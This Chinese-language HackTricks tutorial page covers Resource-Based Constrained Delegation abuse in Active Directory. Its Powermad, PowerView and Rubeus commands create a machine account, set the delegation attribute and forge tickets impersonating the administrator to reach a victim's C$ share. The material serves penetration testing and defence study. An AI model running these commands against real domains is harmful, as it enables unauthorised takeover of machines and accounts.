# 基于资源的受限委派

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本的基于资源的受限委派

这类似于基本的[受限委派](constrained-delegation.md)，但**不是**给予一个**对象**对**服务进行任意用户模拟**的权限。基于资源的受限委派**设置了**能够对其进行任意用户模拟的用户。

在这种情况下，受限对象将具有一个名为_**msDS-AllowedToActOnBehalfOfOtherIdentity**_的属性，其中包含可以对其进行任意用户模拟的用户的名称。

与其他委派形式的另一个重要区别是，任何具有**对机器帐户的写权限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty等_）的用户都可以设置_**msDS-AllowedToActOnBehalfOfOtherIdentity**_（在其他委派形式中，您需要域管理员权限）。

### 新概念

在受限委派中曾经提到，用户的_userAccountControl_值中的**`TrustedToAuthForDelegation`**标志是执行**S4U2Self**所需的。但这并不完全正确。\
事实是，即使没有该值，如果您是一个**服务**（具有SPN），您也可以对任何用户执行**S4U2Self**，但是，如果您**具有`TrustedToAuthForDelegation`**，返回的TGS将是**可转发的**，如果您**没有**该标志，则返回的TGS将**不会**是**可转发的**。

然而，如果在**S4U2Proxy**中使用的**TGS**是**不可转发的**，尝试滥用**基本的受限委派**将**不起作用**。但是，如果您试图利用**基于资源的受限委派**，它将起作用（这不是一个漏洞，显然是一个功能）。

### 攻击结构

> 如果您对**计算机**帐户具有**写等效权限**，则可以在该计算机中获得**特权访问**。

假设攻击者已经对受害者计算机具有**写等效权限**。

1. 攻击者**入侵**具有**SPN**的帐户或**创建一个**（“服务A”）。请注意，**任何**_管理员用户_，即使没有其他特殊权限，也可以**创建**多达10个**计算机对象（**_**MachineAccountQuota**_**）**并为它们设置SPN。因此，攻击者可以只需创建一个计算机对象并设置一个SPN。
2. 攻击者**滥用**其对受害计算机（服务B）的**写权限**，配置**基于资源的受限委派以允许服务A对该受害计算机（服务B）进行任意用户模拟**。
3. 攻击者使用Rubeus执行**完整的S4U攻击**（S4U2Self和S4U2Proxy），从服务A到服务B为具有对服务B特权访问的用户请求**TGS**。
1. S4U2Self（从受损/创建的帐户的SPN）：请求**管理员到我的TGS**（不可转发）。
2. S4U2Proxy：使用前一步的**不可转发TGS**请求**管理员到受害主机的TGS**。
3. 即使您使用的是不可转发的TGS，由于您正在利用基于资源的受限委派，它也会起作用。
4. 攻击者可以**传递票据**并**模拟**用户以获得对受害服务B的**访问权限**。

要检查域的_**MachineAccountQuota**_，您可以使用：
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

您可以使用[powermad](https://github.com/Kevin-Robertson/Powermad)在域内创建计算机对象**：**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置基于资源的受限委派

**使用activedirectory PowerShell模块**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的S4U攻击

首先，我们创建了具有密码`123456`的新计算机对象，因此我们需要该密码的哈希值：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的RC4和AES哈希值。\
现在，可以执行攻击：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
您可以使用Rubeus 的 `/altservice` 参数仅请求一次即可生成更多票证：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
请注意，用户具有一个名为“**无法委派**”的属性。如果用户的此属性设置为True，则您将无法冒充他。此属性可以在BloodHound中查看。
{% endhint %}

### 访问

最后一个命令将执行**完整的S4U攻击，并将TGS注入**从管理员到受害主机的**内存**中。\
在此示例中，请求了管理员的**CIFS**服务的TGS，因此您将能够访问**C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的服务票证

了解[**这里可用的服务票证**](silver-ticket.md#available-services)。

## Kerberos错误

- **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着Kerberos配置为不使用DES或RC4，而您提供的只是RC4哈希。在Rubeus中至少提供AES256哈希（或只提供rc4、aes128和aes256哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与DC的时间不同，Kerberos无法正常工作。
- **`preauth_failed`**：这意味着给定的用户名+哈希无法用于登录。您可能在生成哈希时忘记在用户名中加入“$”（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
- **`KDC_ERR_BADOPTION`**：这可能意味着：
  - 您尝试模拟的用户无法访问所需的服务（因为您无法模拟该用户或因为其权限不足）
  - 所请求的服务不存在（如果您请求winrm的票证，但winrm未运行）
  - 创建的fakecomputer在易受攻击的服务器上失去了特权，您需要将其还原。

## 参考资料

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
